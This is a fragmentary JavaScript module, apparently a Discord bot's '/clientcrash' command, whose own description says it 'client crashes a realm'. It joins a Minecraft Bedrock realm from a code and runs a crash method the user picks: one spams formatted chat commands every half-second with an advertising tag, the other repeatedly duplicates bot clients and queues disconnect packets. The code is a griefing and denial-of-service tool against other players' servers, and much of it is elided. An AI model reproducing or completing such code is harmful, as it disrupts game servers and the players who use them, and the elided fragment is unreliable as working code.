...
const { createBot, parseKickMessage, dupeClients } = require("../../common/bp-dp.js");
...
module.exports = {
	name: "clientcrash",
	description: "client crashes a realm",
	options: [
		{
			type: 3,
			name: "code",
	...
	execute: async (interaction, args, dbUser) => {
		...
		const embed = {
			title: "Client Realm Crasher",
			timestamp: new Date(),
			color: 65280,
			description: "Please select a client crash method from the dropdown below.",
			footer: {
				text: `/clientcrash | Command used by ${user.username}`,
...
async function joinRealm(interaction, realm, address, dbUser) {
	...
	if (crashType === 1) {
		...
		client.on("play_status", (packet) => {
			...
			interval = setInterval(() => {
				client.sendCommand(`tell @a §l§c§k${message} | .gg/antip2w`, 5);
			}, 500)
	...
	if (crashType === 2) {
		...
		client.on("play_status", (packet) => {
			...
			interval = setInterval(() => {
				dupeClients(client, dbUser.skin, true);

				client.queue(`disconnect_${Math.floor(Math.random() * (5 - 2 + 1) + 2)}`, {
